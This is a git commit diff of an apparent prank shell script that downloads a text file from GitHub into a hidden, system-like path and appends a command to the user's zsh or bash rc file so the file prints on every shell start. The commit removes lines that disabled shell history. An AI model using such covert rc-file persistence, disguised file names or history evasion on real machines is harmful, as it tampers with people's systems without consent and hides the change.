9c00a14c85aef62daa1dea84babc659beb63dd83
me0w <romain.panno@epitech.eu>
2023-01-27 09:36:48 +0100

    Remove useless code

--- amogus_script.sh
+++ amogus_script.sh
@@ -4,9 +4,6 @@ TARGETPATH=$HOME/.system.d_file
 
 wget -O $TARGETPATH https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus.txt
 
-unset HISTFILE
-set +o history
-
 if [[ -n "$(echo $SHELL | grep 'zsh')" ]]; then
     echo -e "\ncat $TARGETPATH" >> ${ZDOTDIR:-$HOME}/.zshrc
 elif [[ -n "$(echo $SHELL | grep 'bash')" ]]; then
